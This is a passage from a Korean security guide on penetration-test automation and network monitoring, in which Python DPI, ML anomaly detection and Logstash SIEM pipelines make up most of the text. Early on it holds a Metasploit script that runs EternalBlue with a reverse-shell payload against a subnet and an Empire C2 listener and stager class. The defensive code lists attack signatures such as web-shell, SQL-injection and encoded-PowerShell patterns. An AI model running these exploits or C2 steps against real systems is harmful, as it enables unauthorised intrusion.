        return response.status_code == 200

    def get_scan_results(self, scan_id):
        response = requests.get(
            f"{self.url}/scans/{scan_id}",
            headers=self.headers
        )

        if response.status_code == 200:
            return response.json()
        else:
            raise Exception(f"Failed to get results: {response.text}")
```

##### 침투 테스트 자동화

###### Metasploit Framework 자동화

```ruby
# Metasploit Resource Script 예시
# auto_exploit.rc

use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 21,22,23,25,53,80,110,443,993,995
run

# SMB 취약점 스캔
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# MS17-010 취약점 확인
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# 취약한 호스트에 대해 자동 익스플로잇
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
run

# 실행: msfconsole -r auto_exploit.rc
```

###### Empire 프레임워크 활용

```python
# Empire API를 통한 자동화
import requests
import time

class EmpireAutomation:
    def __init__(self, url, token):
        self.url = url
        self.token = token
        self.headers = {
            'Authorization': f'Bearer {self.token}',
            'Content-Type': 'application/json'
        }

    def create_listener(self, name, port):
        data = {
            'name': name,
            'module': 'http',
            'options': {
                'Host': '0.0.0.0',
                'Port': port,
                'CertPath': '',
                'DefaultDelay': 5,
                'DefaultJitter': 0.0,
                'DefaultProfile': '/admin/get.php,/news.php,/login/process.php'
            }
        }

        response = requests.post(
            f"{self.url}/api/listeners",
            headers=self.headers,
            json=data
        )

        return response.json()

    def generate_stager(self, listener_name, stager_type='multi/launcher'):
        data = {
            'StagerName': stager_type,
            'Listener': listener_name
        }

        response = requests.post(
            f"{self.url}/api/stagers",
            headers=self.headers,
            json=data
        )

        return response.json()
```

### 3.5 네트워크 보안 모니터링 확장

#### 3.5.1 고급 트래픽 분석 기법

##### 딥 패킷 인스펙션 (DPI) 구현

```python
# Scapy를 이용한 고급 DPI 시스템
from scapy.all import *
import re
import sqlite3
from datetime import datetime
import threading

class DeepPacketInspector:
    def __init__(self, interface='eth0'):
        self.interface = interface
        self.db_connection = sqlite3.connect('network_analysis.db', check_same_thread=False)
        self.setup_database()
        self.protocol_stats = {}
        self.signature_patterns = self.load_malware_signatures()
        self.suspicious_activities = []

    def setup_database(self):
        cursor = self.db_connection.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS packet_analysis (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                src_ip TEXT,
                dst_ip TEXT,
                protocol TEXT,
                src_port INTEGER,
                dst_port INTEGER,
                packet_size INTEGER,
                flags TEXT,
                payload_hash TEXT,
                threat_score INTEGER,
                analysis_result TEXT
            )
        ''')
        self.db_connection.commit()

    def load_malware_signatures(self):
        return {
            'web_shells': [
                rb'eval\s*\(\s*base64_decode\s*\(',
                rb'system\s*\(\s*\$_GET\s*\[',
                rb'exec\s*\(\s*\$_POST\s*\[',
                rb'passthru\s*\(\s*\$_REQUEST'
            ],
            'sql_injection': [
                rb'union\s+select\s+.*from',
                rb'or\s+1\s*=\s*1',
                rb'drop\s+table\s+',
                rb'xp_cmdshell'
            ],
            'malware_communication': [
                rb'cmd\.exe',
                rb'powershell\.exe.*-enc\s+',
                rb'certutil.*-decode',
                rb'bitsadmin.*\/transfer'
            ],
            'data_exfiltration': [
                rb'password.*=.*[a-zA-Z0-9]{8,}',
                rb'credit.*card.*\d{4}.*\d{4}.*\d{4}.*\d{4}',
                rb'ssn.*\d{3}-\d{2}-\d{4}'
            ]
        }

    def analyze_packet(self, packet):
        analysis_result = {
            'timestamp': datetime.now().isoformat(),
            'threat_score': 0,
            'threats': [],
            'protocols': [],
            'anomalies': []
        }

        if IP in packet:
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            packet_size = len(packet)

            # 프로토콜 분석
            if TCP in packet:
                src_port = packet[TCP].sport
                dst_port = packet[TCP].dport
                tcp_flags = packet[TCP].flags

                analysis_result['protocols'].append('TCP')

                # HTTP 트래픽 분석
                if dst_port == 80 or src_port == 80 or dst_port == 8080:
                    if Raw in packet:
                        http_payload = packet[Raw].load.decode('utf-8', errors='ignore')
                        analysis_result.update(self.analyze_http_traffic(http_payload))

                # HTTPS 트래픽 분석
                elif dst_port == 443 or src_port == 443:
                    analysis_result.update(self.analyze_tls_traffic(packet))

                # FTP 트래픽 분석
                elif dst_port == 21 or src_port == 21:
                    if Raw in packet:
                        ftp_payload = packet[Raw].load.decode('utf-8', errors='ignore')
                        analysis_result.update(self.analyze_ftp_traffic(ftp_payload))

                # SSH 트래픽 분석
                elif dst_port == 22 or src_port == 22:
                    analysis_result.update(self.analyze_ssh_traffic(packet))

                # 포트 스캔 탐지
                if tcp_flags == 2:  # SYN flag
                    self.detect_port_scan(src_ip, dst_ip, dst_port)

            elif UDP in packet:
                src_port = packet[UDP].sport
                dst_port = packet[UDP].dport
                analysis_result['protocols'].append('UDP')

                # DNS 트래픽 분석
                if dst_port == 53 or src_port == 53:
                    if DNS in packet:
                        analysis_result.update(self.analyze_dns_traffic(packet[DNS]))

                # DHCP 트래픽 분석
                elif dst_port == 67 or dst_port == 68:
                    analysis_result.update(self.analyze_dhcp_traffic(packet))

            # 이상 크기 패킷 탐지
            if packet_size > 9000:  # Jumbo frame 또는 비정상 크기
                analysis_result['anomalies'].append('oversized_packet')
                analysis_result['threat_score'] += 2

            # 페이로드 시그니처 매칭
            if Raw in packet:
                payload = packet[Raw].load
                signature_matches = self.check_malware_signatures(payload)
                if signature_matches:
                    analysis_result['threats'].extend(signature_matches)
                    analysis_result['threat_score'] += len(signature_matches) * 5

            # 데이터베이스에 저장
            self.store_analysis_result(packet, analysis_result)

        return analysis_result

    def analyze_http_traffic(self, payload):
        result = {'http_analysis': {}, 'threats': [], 'threat_score': 0}

        # HTTP 요청 파싱
        lines = payload.split('\n')
        if lines:
            request_line = lines[0]
            if any(method in request_line for method in ['GET', 'POST', 'PUT', 'DELETE']):
                result['http_analysis']['method'] = request_line.split()[0]
                result['http_analysis']['path'] = request_line.split()[1]

                # SQL Injection 패턴 탐지
                for pattern in self.signature_patterns['sql_injection']:
                    if re.search(pattern, request_line.encode(), re.IGNORECASE):
                        result['threats'].append('sql_injection_attempt')
                        result['threat_score'] += 8

                # Directory Traversal 탐지
                if '../' in request_line or '..\\' in request_line:
                    result['threats'].append('directory_traversal')
                    result['threat_score'] += 6

                # Command Injection 탐지
                cmd_patterns = [r';.*whoami', r'&.*id', r'\|.*cat', r'`.*ps']
                for pattern in cmd_patterns:
                    if re.search(pattern, request_line):
                        result['threats'].append('command_injection')
                        result['threat_score'] += 7

                # XSS 패턴 탐지
                xss_patterns = [r'<script', r'javascript:', r'onload=', r'onerror=']
                for pattern in xss_patterns:
                    if re.search(pattern, request_line, re.IGNORECASE):
                        result['threats'].append('xss_attempt')
                        result['threat_score'] += 5

        return result

    def analyze_tls_traffic(self, packet):
        result = {'tls_analysis': {}, 'threats': [], 'threat_score': 0}

        if Raw in packet:
            # TLS 핸드셰이크 분석
            try:
                raw_data = packet[Raw].load
                if len(raw_data) >= 5:
                    content_type = raw_data[0]
                    tls_version = (raw_data[1] << 8) | raw_data[2]

                    result['tls_analysis']['content_type'] = content_type
                    result['tls_analysis']['version'] = tls_version

                    # 오래된 TLS 버전 탐지
                    if tls_version < 0x0303:  # TLS 1.2 미만
                        result['threats'].append('deprecated_tls_version')
                        result['threat_score'] += 3

                    # Client Hello 분석 (SNI 추출)
                    if content_type == 22:  # Handshake
                        sni = self.extract_sni_from_client_hello(raw_data)
                        if sni:
                            result['tls_analysis']['sni'] = sni
                            # 의심스러운 도메인 체크
                            if self.is_suspicious_domain(sni):
                                result['threats'].append('suspicious_domain')
                                result['threat_score'] += 6

            except Exception as e:
                result['tls_analysis']['error'] = str(e)

        return result

    def analyze_dns_traffic(self, dns_packet):
        result = {'dns_analysis': {}, 'threats': [], 'threat_score': 0}

        if dns_packet.qr == 0:  # DNS 질의
            query_name = dns_packet.qd.qname.decode('utf-8')
            result['dns_analysis']['query'] = query_name
            result['dns_analysis']['query_type'] = dns_packet.qd.qtype

            # DNS 터널링 탐지
            if len(query_name) > 100:
                result['threats'].append('dns_tunneling_long_query')
                result['threat_score'] += 7

            # 의심스러운 TLD
            suspicious_tlds = ['.tk', '.ml', '.ga', '.cf']
            if any(tld in query_name for tld in suspicious_tlds):
                result['threats'].append('suspicious_tld')
                result['threat_score'] += 3

            # DGA (Domain Generation Algorithm) 패턴 탐지
            if self.detect_dga_pattern(query_name):
                result['threats'].append('dga_domain')
                result['threat_score'] += 8

            # Fast flux 탐지
            subdomain_count = query_name.count('.')
            if subdomain_count > 5:
                result['threats'].append('fast_flux_candidate')
                result['threat_score'] += 4

        return result

    def detect_dga_pattern(self, domain):
        """DGA 생성 도메인 패턴 탐지"""
        # 높은 엔트로피 검사
        import math
        from collections import Counter

        if len(domain) < 8:
            return False

        # 문자 빈도 계산
        char_counts = Counter(domain.lower())
        entropy = -sum((count/len(domain)) * math.log2(count/len(domain))
                      for count in char_counts.values())

        # 높은 엔트로피 (> 3.5)는 랜덤 생성 의심
        if entropy > 3.5:
            return True

        # 연속된 자음/모음 비율 검사
        vowels = 'aeiou'
        consonant_count = 0
        vowel_count = 0
        for char in domain.lower():
            if char.isalpha():
                if char in vowels:
                    vowel_count += 1
                else:
                    consonant_count += 1

        if vowel_count == 0 or consonant_count == 0:
            return True

        vowel_ratio = vowel_count / (vowel_count + consonant_count)
        if vowel_ratio < 0.1 or vowel_ratio > 0.8:
            return True

        return False

    def extract_sni_from_client_hello(self, data):
        """TLS Client Hello에서 SNI 추출"""
        try:
            # TLS 핸드셰이크 구조 파싱
            if len(data) < 43:
                return None

            # 세션 ID 길이 건너뛰기
            session_id_len = data[43]
            pos = 44 + session_id_len

            if pos + 2 >= len(data):
                return None

            # Cipher suites 길이 건너뛰기
            cipher_suites_len = (data[pos] << 8) | data[pos + 1]
            pos += 2 + cipher_suites_len

            if pos + 1 >= len(data):
                return None

            # Compression methods 길이 건너뛰기
            compression_len = data[pos]
            pos += 1 + compression_len

            if pos + 2 >= len(data):
                return None

            # Extensions 길이
            extensions_len = (data[pos] << 8) | data[pos + 1]
            pos += 2

            end_pos = pos + extensions_len
            while pos < end_pos - 4:
                ext_type = (data[pos] << 8) | data[pos + 1]
                ext_len = (data[pos + 2] << 8) | data[pos + 3]
                pos += 4

                # SNI extension (type 0)
                if ext_type == 0 and pos + ext_len <= len(data):
                    # SNI 데이터 파싱
                    sni_list_len = (data[pos] << 8) | data[pos + 1]
                    pos += 2
                    if pos < len(data):
                        name_type = data[pos]
                        if name_type == 0:  # hostname
                            pos += 1
                            name_len = (data[pos] << 8) | data[pos + 1]
                            pos += 2
                            if pos + name_len <= len(data):
                                return data[pos:pos + name_len].decode('utf-8')

                pos += ext_len

        except Exception:
            pass

        return None

    def is_suspicious_domain(self, domain):
        """의심스러운 도메인 검사"""
        suspicious_keywords = [
            'tempmail', 'guerrillamail', 'mailinator',
            'banking', 'paypal', 'amazon-security',
            'microsoft-update', 'adobe-update',
            'bit.ly', 'tinyurl', 'goo.gl'
        ]

        return any(keyword in domain.lower() for keyword in suspicious_keywords)

    def check_malware_signatures(self, payload):
        """페이로드에서 멀웨어 시그니처 검사"""
        matches = []

        for category, patterns in self.signature_patterns.items():
            for pattern in patterns:
                if re.search(pattern, payload, re.IGNORECASE):
                    matches.append(f"{category}_detected")

        return matches

    def detect_port_scan(self, src_ip, dst_ip, dst_port):
        """포트 스캔 패턴 탐지"""
        current_time = time.time()
        key = f"{src_ip}_{dst_ip}"

        if key not in self.scan_tracking:
            self.scan_tracking[key] = {'ports': set(), 'first_seen': current_time}

        self.scan_tracking[key]['ports'].add(dst_port)

        # 5분 내에 10개 이상 포트 접근 시 스캔으로 판단
        if (current_time - self.scan_tracking[key]['first_seen'] < 300 and
            len(self.scan_tracking[key]['ports']) >= 10):

            alert = {
                'type': 'port_scan_detected',
                'src_ip': src_ip,
                'dst_ip': dst_ip,
                'ports_scanned': list(self.scan_tracking[key]['ports']),
                'duration': current_time - self.scan_tracking[key]['first_seen']
            }
            self.generate_alert(alert)

    def store_analysis_result(self, packet, analysis):
        """분석 결과를 데이터베이스에 저장"""
        cursor = self.db_connection.cursor()

        src_ip = packet[IP].src if IP in packet else ''
        dst_ip = packet[IP].dst if IP in packet else ''
        src_port = packet[TCP].sport if TCP in packet else (packet[UDP].sport if UDP in packet else 0)
        dst_port = packet[TCP].dport if TCP in packet else (packet[UDP].dport if UDP in packet else 0)
        protocol = 'TCP' if TCP in packet else ('UDP' if UDP in packet else 'OTHER')

        cursor.execute('''
            INSERT INTO packet_analysis
            (timestamp, src_ip, dst_ip, protocol, src_port, dst_port, packet_size, threat_score, analysis_result)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            analysis['timestamp'],
            src_ip, dst_ip, protocol, src_port, dst_port,
            len(packet), analysis['threat_score'],
            str(analysis)
        ))

        self.db_connection.commit()

    def generate_security_report(self, hours=24):
        """보안 분석 보고서 생성"""
        cursor = self.db_connection.cursor()

        # 최근 24시간 통계
        cursor.execute('''
            SELECT
                COUNT(*) as total_packets,
                AVG(threat_score) as avg_threat_score,
                MAX(threat_score) as max_threat_score,
                COUNT(CASE WHEN threat_score > 5 THEN 1 END) as high_risk_packets
            FROM packet_analysis
            WHERE datetime(timestamp) > datetime('now', '-24 hours')
        ''')

        stats = cursor.fetchone()

        # 상위 위협 IP
        cursor.execute('''
            SELECT src_ip, SUM(threat_score) as total_threat_score, COUNT(*) as packet_count
            FROM packet_analysis
            WHERE datetime(timestamp) > datetime('now', '-24 hours') AND threat_score > 0
            GROUP BY src_ip
            ORDER BY total_threat_score DESC
            LIMIT 10
        ''')

        top_threats = cursor.fetchall()

        report = {
            'report_time': datetime.now().isoformat(),
            'period_hours': hours,
            'statistics': {
                'total_packets': stats[0],
                'average_threat_score': stats[1],
                'max_threat_score': stats[2],
                'high_risk_packets': stats[3]
            },
            'top_threat_sources': [
                {
                    'ip': row[0],
                    'total_threat_score': row[1],
                    'packet_count': row[2]
                } for row in top_threats
            ]
        }

        return report

    def start_analysis(self):
        """패킷 분석 시작"""
        print(f"Starting deep packet inspection on {self.interface}")
        self.scan_tracking = {}

        def packet_handler(packet):
            try:
                analysis = self.analyze_packet(packet)
                if analysis['threat_score'] > 5:
                    print(f"High risk packet detected: {analysis}")
            except Exception as e:
                print(f"Error analyzing packet: {e}")

        sniff(iface=self.interface, prn=packet_handler, store=0)

# 사용 예시
inspector = DeepPacketInspector('eth0')
inspector.start_analysis()
```

#### 3.5.2 Machine Learning 기반 이상 탐지

##### 네트워크 이상 탐지 ML 모델

```python
# 네트워크 트래픽 이상 탐지를 위한 머신러닝 모델
import numpy as np
import pandas as pd
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
from sklearn.metrics import classification_report
import joblib
from datetime import datetime, timedelta
import psutil
import time

class NetworkAnomalyDetector:
    def __init__(self, model_path='network_anomaly_model.pkl'):
        self.model_path = model_path
        self.scaler = StandardScaler()
        self.model = None
        self.feature_columns = [
            'bytes_per_second', 'packets_per_second', 'avg_packet_size',
            'tcp_ratio', 'udp_ratio', 'unique_src_ips', 'unique_dst_ips',
            'port_entropy', 'connection_rate', 'error_rate'
        ]
        self.baseline_data = []

    def collect_network_features(self, duration=60):
        """네트워크 트래픽에서 특성 추출"""
        start_time = time.time()
        end_time = start_time + duration

        # 초기 네트워크 통계
        initial_stats = psutil.net_io_counters()
        tcp_connections = len(psutil.net_connections(kind='tcp'))
        udp_connections = len(psutil.net_connections(kind='udp'))

        packet_sizes = []
        src_ips = set()
        dst_ips = set()
        dst_ports = []
        protocol_counts = {'tcp': 0, 'udp': 0, 'other': 0}
        errors = 0

        # 패킷 캡처를 통한 추가 정보 수집
        def packet_handler(packet):
            nonlocal packet_sizes, src_ips, dst_ips, dst_ports, protocol_counts

            if IP in packet:
                src_ips.add(packet[IP].src)
                dst_ips.add(packet[IP].dst)
                packet_sizes.append(len(packet))

                if TCP in packet:
                    protocol_counts['tcp'] += 1
                    dst_ports.append(packet[TCP].dport)
                elif UDP in packet:
                    protocol_counts['udp'] += 1
                    dst_ports.append(packet[UDP].dport)
                else:
                    protocol_counts['other'] += 1

        # 백그라운드에서 패킷 캡처
        capture_thread = threading.Thread(
            target=lambda: sniff(timeout=duration, prn=packet_handler, store=0)
        )
        capture_thread.start()

        # 대기
        time.sleep(duration)
        capture_thread.join()

        # 최종 네트워크 통계
        final_stats = psutil.net_io_counters()

        # 특성 계산
        bytes_diff = final_stats.bytes_sent + final_stats.bytes_recv - (
            initial_stats.bytes_sent + initial_stats.bytes_recv)
        packets_diff = final_stats.packets_sent + final_stats.packets_recv - (
            initial_stats.packets_sent + initial_stats.packets_recv)

        # 포트 엔트로피 계산
        port_entropy = self.calculate_entropy(dst_ports)

        features = {
            'bytes_per_second': bytes_diff / duration,
            'packets_per_second': packets_diff / duration,
            'avg_packet_size': np.mean(packet_sizes) if packet_sizes else 0,
            'tcp_ratio': protocol_counts['tcp'] / max(sum(protocol_counts.values()), 1),
            'udp_ratio': protocol_counts['udp'] / max(sum(protocol_counts.values()), 1),
            'unique_src_ips': len(src_ips),
            'unique_dst_ips': len(dst_ips),
            'port_entropy': port_entropy,
            'connection_rate': (tcp_connections + udp_connections) / duration,
            'error_rate': (final_stats.errin + final_stats.errout) / max(packets_diff, 1)
        }

        return features

    def calculate_entropy(self, data):
        """데이터의 엔트로피 계산"""
        if not data:
            return 0

        from collections import Counter
        import math

        value_counts = Counter(data)
        total = len(data)
        entropy = 0

        for count in value_counts.values():
            probability = count / total
            entropy -= probability * math.log2(probability)

        return entropy

    def train_model(self, training_data=None, contamination=0.1):
        """이상 탐지 모델 훈련"""
        if training_data is None:
            # 정상 트래픽 데이터 수집
            print("Collecting baseline network data for training...")
            training_features = []

            for i in range(100):  # 100분간의 정상 트래픽 수집
                print(f"Collecting sample {i+1}/100")
                features = self.collect_network_features(60)  # 1분간 수집
                training_features.append(list(features.values()))

            training_data = np.array(training_features)

        # 데이터 전처리
        training_data_scaled = self.scaler.fit_transform(training_data)

        # Isolation Forest 모델 훈련
        self.model = IsolationForest(
            contamination=contamination,
            random_state=42,
            n_estimators=100
        )

        self.model.fit(training_data_scaled)

        # 모델 저장
        model_data = {
            'model': self.model,
            'scaler': self.scaler,
            'feature_columns': self.feature_columns
        }
        joblib.dump(model_data, self.model_path)

        print("Model trained and saved successfully")

    def load_model(self):
        """저장된 모델 로드"""
        try:
            model_data = joblib.load(self.model_path)
            self.model = model_data['model']
            self.scaler = model_data['scaler']
            self.feature_columns = model_data['feature_columns']
            print("Model loaded successfully")
        except FileNotFoundError:
            print("No saved model found. Please train the model first.")

    def detect_anomaly(self, features):
        """이상 징후 탐지"""
        if self.model is None:
            raise ValueError("Model not loaded. Please load or train model first.")

        # 특성 데이터 준비
        feature_vector = np.array([list(features.values())]).reshape(1, -1)
        feature_vector_scaled = self.scaler.transform(feature_vector)

        # 예측
        prediction = self.model.predict(feature_vector_scaled)[0]
        anomaly_score = self.model.decision_function(feature_vector_scaled)[0]

        is_anomaly = prediction == -1

        return {
            'is_anomaly': is_anomaly,
            'anomaly_score': anomaly_score,
            'features': features,
            'timestamp': datetime.now().isoformat()
        }

    def continuous_monitoring(self, check_interval=300):
        """연속적인 이상 탐지 모니터링"""
        print(f"Starting continuous anomaly detection (check every {check_interval}s)")

        while True:
            try:
                # 네트워크 특성 수집
                features = self.collect_network_features(60)

                # 이상 탐지
                result = self.detect_anomaly(features)

                if result['is_anomaly']:
                    self.handle_anomaly(result)
                else:
                    print(f"Normal traffic detected at {result['timestamp']}")

                # 대기
                time.sleep(check_interval)

            except KeyboardInterrupt:
                print("Monitoring stopped by user")
                break
            except Exception as e:
                print(f"Error in monitoring: {e}")
                time.sleep(60)

    def handle_anomaly(self, anomaly_result):
        """이상 징후 처리"""
        print(f"ANOMALY DETECTED at {anomaly_result['timestamp']}")
        print(f"Anomaly Score: {anomaly_result['anomaly_score']:.3f}")

        # 상세 분석
        features = anomaly_result['features']
        print("Network Features:")
        for feature, value in features.items():
            print(f"  {feature}: {value:.2f}")

        # 알림 발송
        self.send_anomaly_alert(anomaly_result)

        # 로그 기록
        self.log_anomaly(anomaly_result)

    def send_anomaly_alert(self, anomaly_result):
        """이상 징후 알림 발송"""
        # 슬랙 알림 예시
        webhook_url = "YOUR_SLACK_WEBHOOK_URL"

        message = {
            "text": "🚨 Network Anomaly Detected",
            "attachments": [
                {
                    "color": "danger",
                    "fields": [
                        {
                            "title": "Anomaly Score",
                            "value": f"{anomaly_result['anomaly_score']:.3f}",
                            "short": True
                        },
                        {
                            "title": "Detection Time",
                            "value": anomaly_result['timestamp'],
                            "short": True
                        },
                        {
                            "title": "Key Features",
                            "value": self.format_features_for_alert(anomaly_result['features']),
                            "short": False
                        }
                    ]
                }
            ]
        }

        try:
            requests.post(webhook_url, json=message)
        except Exception as e:
            print(f"Failed to send alert: {e}")

    def format_features_for_alert(self, features):
        """알림용 특성 포맷팅"""
        formatted = []
        for key, value in features.items():
            if isinstance(value, float):
                formatted.append(f"{key}: {value:.2f}")
            else:
                formatted.append(f"{key}: {value}")

        return "\n".join(formatted)

    def log_anomaly(self, anomaly_result):
        """이상 징후 로그 기록"""
        log_entry = {
            'timestamp': anomaly_result['timestamp'],
            'anomaly_score': anomaly_result['anomaly_score'],
            'features': anomaly_result['features']
        }

        with open('/var/log/network_anomalies.log', 'a') as f:
            f.write(f"{datetime.now().isoformat()}: {log_entry}\n")

# 사용 예시
detector = NetworkAnomalyDetector()

# 모델 훈련 (최초 1회)
# detector.train_model()

# 모델 로드
detector.load_model()

# 연속 모니터링 시작
detector.continuous_monitoring(check_interval=300)  # 5분마다 체크
```

#### 3.5.3 자동화된 SIEM 통합

##### ELK Stack 고급 파이프라인

```yaml
# Elasticsearch 클러스터 설정
# /etc/elasticsearch/elasticsearch.yml
cluster.name: security-monitoring
node.name: node-1
path.data: /var/lib/elasticsearch
path.logs: /var/log/elasticsearch
network.host: 0.0.0.0
http.port: 9200
discovery.seed_hosts: ["es-node1", "es-node2", "es-node3"]
cluster.initial_master_nodes: ["node-1", "node-2", "node-3"]

# 보안 설정
xpack.security.enabled: true
xpack.security.transport.ssl.enabled: true
xpack.security.transport.ssl.verification_mode: certificate
xpack.security.transport.ssl.client_authentication: required
xpack.security.transport.ssl.keystore.path: elastic-certificates.p12
xpack.security.transport.ssl.truststore.path: elastic-certificates.p12

# 머신러닝 활성화
xpack.ml.enabled: true
xpack.ml.max_machine_memory_percent: 30

# 알림 설정
xpack.notification.email.default_account: gmail
xpack.notification.email.account:
  gmail:
    profile: gmail
    smtp:
      auth: true
      starttls.enable: true
      host: smtp.gmail.com
      port: 587
      user: your-email@gmail.com
      password: your-app-password
```

##### Logstash 고급 보안 파이프라인

```ruby
# /etc/logstash/conf.d/security-pipeline.conf
input {
  # 여러 소스에서 로그 수집
  beats {
    port => 5044
    client_inactivity_timeout => 60
  }

  # Syslog
  syslog {
    port => 514
    type => "syslog"
  }

  # Windows Event Log via WinLogBeat
  beats {
    port => 5045
    type => "winlogbeat"
  }

  # HTTP 로그
  http {
    port => 8080
    type => "http"
  }

  # Kafka에서 실시간 이벤트
  kafka {
    bootstrap_servers => "kafka1:9092,kafka2:9092"
    topics => ["security-events", "network-logs"]
    codec => "json"
  }
}

filter {
  # 공통 필드 추가
  mutate {
    add_field => { "ingested_at" => "%{@timestamp}" }
  }

  # 타입별 처리
  if [type] == "syslog" {
    # SSH 로그인 분석
    if [program] == "sshd" {
      if "Failed password" in [message] {
        grok {
          match => {
            "message" => "Failed password for (?<failed_user>\w+) from (?<src_ip>\d+\.\d+\.\d+\.\d+)"
          }
        }
        mutate {
          add_tag => ["ssh_failed_login"]
        }
      } else if "Accepted password" in [message] {
        grok {
          match => {
            "message" => "Accepted password for (?<successful_user>\w+) from (?<src_ip>\d+\.\d+\.\d+\.\d+)"
          }
        }
        mutate {
          add_tag => ["ssh_successful_login"]
        }
      }

      # 무차별 대입 공격 탐지 로직
      if [src_ip] {
        aggregate {
          task_id => "%{src_ip}_ssh_attempts"
          code => "
            map['attempts'] ||= 0
            map['attempts'] += 1
            map['first_attempt'] ||= event.get('@timestamp')
            map['last_attempt'] = event.get('@timestamp')

            # 5분 내 10회 이상 실패 시 브루트포스로 판단
            time_diff = (Time.parse(map['last_attempt'].to_s) - Time.parse(map['first_attempt'].to_s)) / 60
            if map['attempts'] >= 10 && time_diff <= 5
              event.set('brute_force_detected', true)
              event.set('attack_duration_minutes', time_diff)
              event.set('total_attempts', map['attempts'])
              map['attempts'] = 0  # 리셋
            end
          "
          push_previous_map_as_event => true
          timeout => 300
        }
      }
    }
  }

  # Apache/Nginx 접근 로그 분석
  if [type] == "apache" {
    grok {
      match => { "message" => "%{COMBINEDAPACHELOG}" }
    }

    # IP 지역 정보 추가
    if [clientip] {
      geoip {
        source => "clientip"
        target => "geoip"
        database => "/usr/share/logstash/GeoLite2-City.mmdb"
      }
    }

    # 공격 패턴 탐지
    if [request] {
      # SQL Injection 패턴
      if [request] =~ /(?i)(union.*select|drop.*table|exec.*xp_cmdshell)/ {
        mutate {
          add_tag => ["sql_injection_attempt"]
        }
      }

      # XSS 패턴
      if [request] =~ /(?i)(<script|javascript:|onload=|onerror=)/ {
        mutate {
          add_tag => ["xss_attempt"]
        }
      }

      # Directory Traversal
      if [request] =~ /(\.\.\/|\.\.\)/ {
        mutate {
          add_tag => ["directory_traversal"]
        }
      }

      # Command Injection
      if [request] =~ /(?i)(`;.*whoami|&.*id|\|.*cat|`.*ps)/ {
        mutate {
          add_tag => ["command_injection"]
        }
      }
    }

    # 상태 코드 분석
    if [response] >= 400 {
      mutate {
        add_tag => ["http_error"]
      }
    }

    # 봇/크롤러 탐지
    if [agent] =~ /(?i)(bot|crawler|spider|scan|wget|curl)/ {
      mutate {
        add_tag => ["bot_traffic"]
      }
    }
  }

  # Windows Event Log 분석
  if [type] == "winlogbeat" {
    if [event_id] == 4625 {  # Failed logon
      mutate {
        add_tag => ["windows_failed_login"]
      }
    } else if [event_id] == 4624 {  # Successful logon
      mutate {
        add_tag => ["windows_successful_login"]
      }
    } else if [event_id] == 4648 {  # Logon with explicit credentials
      mutate {
        add_tag => ["windows_explicit_login"]
      }
    } else if [event_id] == 4720 {  # User account created
      mutate {
        add_tag => ["user_account_created"]
      }
    }
  }

  # DNS 로그 분석
  if [type] == "dns" {
    if [query_name] {
      # DGA 도메인 탐지
      ruby {
        code => "
          query = event.get('query_name').to_s.downcase

          # 높은 엔트로피 계산
          chars = query.chars
          char_counts = chars.group_by(&:itself).transform_values(&:count)
          entropy = char_counts.values.map { |count|
            prob = count.to_f / chars.length
            -prob * Math.log2(prob)
          }.sum

          event.set('domain_entropy', entropy)

          # DGA 의심 도메인 (엔트로피 > 3.5)
          if entropy > 3.5
            event.set('potential_dga', true)
          end

          # 의심스러운 TLD
          suspicious_tlds = ['.tk', '.ml', '.ga', '.cf', '.top']
          if suspicious_tlds.any? { |tld| query.end_with?(tld) }
            event.set('suspicious_tld', true)
          end
        "
      }
    }
  }

  # 공통 위협 인텔리전스 매칭
  if [src_ip] or [clientip] {
    ruby {
      init => "
        require 'set'
        @malicious_ips = Set.new([
          '192.168.100.100',  # 예시 악성 IP
          '10.0.0.200'
        ])
      "
      code => "
        ip = event.get('src_ip') || event.get('clientip')
        if @malicious_ips.include?(ip)
          event.set('known_malicious_ip', true)
        end
      "
    }
  }

  # 시간 정규화
  date {
    match => [ "timestamp", "ISO8601" ]
    target => "@timestamp"
  }
}

output {
  # 모든 로그를 Elasticsearch에 저장
  elasticsearch {
    hosts => ["es-node1:9200", "es-node2:9200", "es-node3:9200"]
    index => "security-logs-%{+YYYY.MM.dd}"
    user => "elastic"
    password => "${ELASTICSEARCH_PASSWORD}"
    template_name => "security-logs"
    template_pattern => "security-logs-*"
    template => "/etc/logstash/templates/security-template.json"
  }

  # 고위험 이벤트 별도 인덱스
  if "sql_injection_attempt" in [tags] or "xss_attempt" in [tags] or
     "command_injection" in [tags] or [brute_force_detected] {
    elasticsearch {
      hosts => ["es-node1:9200", "es-node2:9200", "es-node3:9200"]
      index => "high-risk-events-%{+YYYY.MM.dd}"
      user => "elastic"
      password => "${ELASTICSEARCH_PASSWORD}"
    }
  }

  # 실시간 알림
  if "sql_injection_attempt" in [tags] {
    http {
      url => "http://alerting-service:8080/webhook/sql-injection"
      http_method => "post"
      content_type => "application/json"
      format => "json"
    }
  }

  # 브루트포스 공격 알림
  if [brute_force_detected] {
    http {
      url => "http://alerting-service:8080/webhook/brute-force"
      http_method => "post"
      content_type => "application/json"
      format => "json"
    }
  }

  # 파일 백업
  file {
    path => "/var/log/logstash/security-backup-%{+YYYY.MM.dd}.log"
    codec => "json_lines"
  }

  # 디버깅용 (개발 환경에서만)
  if [@metadata][env] == "development" {
    stdout {
      codec => "rubydebug"
    }
  }
}
```